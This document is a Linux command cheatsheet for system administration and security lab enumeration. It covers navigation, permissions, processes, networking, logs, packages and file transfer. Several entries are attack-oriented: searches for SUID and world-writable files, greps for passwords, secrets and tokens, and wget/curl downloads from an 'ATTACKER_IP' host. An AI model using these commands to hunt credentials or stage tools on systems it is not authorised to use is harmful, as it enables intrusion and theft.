# Linux Commands

---

## Executive Summary

This cheatsheet is a quick reference for Linux navigation, file handling, users, permissions, processes, networking, services, logs, and package management.

Use it during labs, enumeration, troubleshooting, and system administration.

## System Information

Show kernel and system information:

```bash
uname -a
```

Show distribution:

```bash
cat /etc/os-release
```

Show hostname:

```bash
hostname
```

Show current user:

```bash
whoami
```

Show uptime:

```bash
uptime
```

Show environment variables:

```bash
env
```

## Filesystem Navigation

Print current directory:

```bash
pwd
```

List files:

```bash
ls -la
```

Change directory:

```bash
cd /path/to/directory
```

Show directory tree:

```bash
tree
```

Find file by name:

```bash
find / -name "filename" 2>/dev/null
```

Find writable directories:

```bash
find / -writable -type d 2>/dev/null
```

## File Viewing

View file:

```bash
cat file.txt
```

Page through file:

```bash
less file.txt
```

Show first lines:

```bash
head file.txt
```

Show last lines:

```bash
tail file.txt
```

Follow log output:

```bash
tail -f /var/log/syslog
```

## File Searching

Search text in files:

```bash
grep -R "password" /path 2>/dev/null
```

Case-insensitive search:

```bash
grep -Ri "password" /path 2>/dev/null
```

Search command history:

```bash
history | grep ssh
```

Find files modified in the last day:

```bash
find /path -mtime -1
```

Find large files:

```bash
find / -type f -size +100M 2>/dev/null
```

## Permissions

Show permissions:

```bash
ls -l file.txt
```

Change permissions:

```bash
chmod 755 file.sh
```

Add execute permission:

```bash
chmod +x file.sh
```

Change owner:

```bash
chown user:group file.txt
```

Find SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Find SGID files:

```bash
find / -perm -2000 -type f 2>/dev/null
```

## Users and Groups

Show current user ID and groups:

```bash
id
```

List logged-in users:

```bash
who
```

Show last logins:

```bash
last
```

List users:

```bash
cat /etc/passwd
```

List groups:

```bash
cat /etc/group
```

Show sudo privileges:

```bash
sudo -l
```

## Processes

List processes:

```bash
ps aux
```

Process tree:

```bash
pstree -a
```

Search processes:

```bash
ps aux | grep PROCESS_NAME
```

Kill process by PID:

```bash
kill PID
```

Force kill:

```bash
kill -9 PID
```

Interactive process viewer:

```bash
top
```

## Networking

Show interfaces:

```bash
ip addr
```

Show routes:

```bash
ip route
```

Show listening ports:

```bash
ss -tulpen
```

Show active connections:

```bash
ss -antp
```

Show ARP/neighbor table:

```bash
ip neigh
```

Test connection:

```bash
ping -c 4 TARGET_IP
```

Check TCP port:

```bash
nc -zv TARGET_IP PORT
```

## DNS

Resolve hostname:

```bash
dig example.com
```

Reverse lookup:

```bash
dig -x TARGET_IP
```

Query specific record:

```bash
dig example.com MX
```

Use specific DNS server:

```bash
dig @DNS_SERVER example.com
```

## Services

List running services:

```bash
systemctl --type=service --state=running
```

Check service status:

```bash
systemctl status SERVICE
```

Start service:

```bash
sudo systemctl start SERVICE
```

Stop service:

```bash
sudo systemctl stop SERVICE
```

Enable service on boot:

```bash
sudo systemctl enable SERVICE
```

Disable service on boot:

```bash
sudo systemctl disable SERVICE
```

## Logs

Common log locations:

```text
/var/log/syslog
/var/log/auth.log
/var/log/kern.log
/var/log/apache2/
/var/log/nginx/
/var/log/audit/
```

View authentication logs:

```bash
sudo tail -f /var/log/auth.log
```

Search failed logins:

```bash
grep -i "failed" /var/log/auth.log
```

View systemd logs:

```bash
journalctl
```

View logs for service:

```bash
journalctl -u SERVICE
```

## Packages

Debian/Ubuntu update package list:

```bash
sudo apt update
```

Install package:

```bash
sudo apt install PACKAGE
```

Remove package:

```bash
sudo apt remove PACKAGE
```

List installed packages:

```bash
dpkg -l
```

Red Hat package install:

```bash
sudo dnf install PACKAGE
```

List RPM packages:

```bash
rpm -qa
```

## Compression

Create tar archive:

```bash
tar -cvf archive.tar directory/
```

Extract tar archive:

```bash
tar -xvf archive.tar
```

Create gzip tar archive:

```bash
tar -czvf archive.tar.gz directory/
```

Extract gzip tar archive:

```bash
tar -xzvf archive.tar.gz
```

Zip directory:

```bash
zip -r archive.zip directory/
```

Unzip:

```bash
unzip archive.zip
```

## File Transfer

Start HTTP server:

```bash
python3 -m http.server 8000
```

Download with wget:

```bash
wget http://ATTACKER_IP:8000/file
```

Download with curl:

```bash
curl -O http://ATTACKER_IP:8000/file
```

SCP upload:

```bash
scp file user@TARGET_IP:/tmp/
```

SCP download:

```bash
scp user@TARGET_IP:/tmp/file .
```

## Useful One-Liners

Show top directories by size:

```bash
du -h --max-depth=1 /path 2>/dev/null | sort -h
```

Show current shell:

```bash
echo $SHELL
```

Show PATH:

```bash
echo $PATH
```

Find world-writable files:

```bash
find / -type f -perm -o+w 2>/dev/null
```

Find files containing possible secrets:

```bash
grep -RniE "password|passwd|secret|token|key" /path 2>/dev/null
```

## Notes

- Redirect errors with `2>/dev/null` to reduce noise.
- Use `sudo` only when needed.
- Check logs before assuming a service is broken.
- Confirm the distribution before using package commands.
- Prefer `ss` over older `netstat` on modern Linux systems.